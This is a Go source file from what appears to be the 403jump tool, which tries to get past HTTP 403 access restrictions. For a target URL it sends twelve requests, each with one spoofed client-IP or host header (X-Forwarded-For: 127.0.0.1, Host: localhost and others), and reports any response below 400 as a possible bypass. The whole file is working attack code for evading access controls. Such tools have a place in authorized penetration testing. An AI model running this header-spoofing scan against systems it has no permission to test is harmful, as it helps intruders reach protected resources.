package module

import (
	"fmt"
	"net"
	"net/http"
	"strings"

	"github.com/trap-bytes/403jump/utils"
)

var Headers = [12]string{
	"X-Originating-IP: 127.0.0.1",
	"X-Forwarded-For: 127.0.0.1",
	"X-Forwarded: 127.0.0.1",
	"Forwarded-For: 127.0.0.1",
	"X-Remote-IP: 127.0.0.1",
	"X-Remote-Addr: 127.0.0.1",
	"X-Original-URL: 127.0.0.1",
	"Client-IP: 127.0.0.1",
	"True-Client-IP: 127.0.0.1",
	"Cluster-Client-IP: 127.0.0.1",
	"X-ProxyUser-Ip: 127.0.0.1",
	"Host: localhost",
}

func HttpRequestWithHeaders(client *http.Client, url, cookie, customHeader string) int64 {
	bypass := int64(0)

	for _, header := range Headers {

		req, err := http.NewRequest("GET", url, nil)
		if err != nil {
			fmt.Printf("Error creating request for %s with %s header: %v\n", url, header, err)
			return 0
		}

		parts := strings.SplitN(header, ": ", 2)
		if len(parts) == 2 {
			req.Header.Add(parts[0], parts[1])
		}

		if cookie != "" {
			req.Header.Set("Cookie", cookie)
		}

		if customHeader != "" {
			headerParts := strings.SplitN(customHeader, ":", 2)
			if len(headerParts) == 2 {
				req.Header.Add(strings.TrimSpace(headerParts[0]), strings.TrimSpace(headerParts[1]))
			} else {
				fmt.Printf("Invalid header format: %s\n", header)
			}
		}

		resp, err := client.Do(req)
		if err != nil {
			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				fmt.Printf("Timeout error: Request for %s with %s header took too long to complete.\n", url, header)
				continue
			} else {
				fmt.Printf("Error performing request for %s with %s header: %v\n", url, header, err)
				return 0
			}
		}
		defer resp.Body.Close()

		if resp.StatusCode < http.StatusBadRequest {
			bypassMessage := fmt.Sprintf("Possible bypass found for %s via %s header. Status code: %d\n", url, header, resp.StatusCode)
			coloredMessage := utils.Colorize(bypassMessage, "\033[32m") // Green color
			fmt.Print(coloredMessage)
			bypass++
		}
	}
	return bypass
}
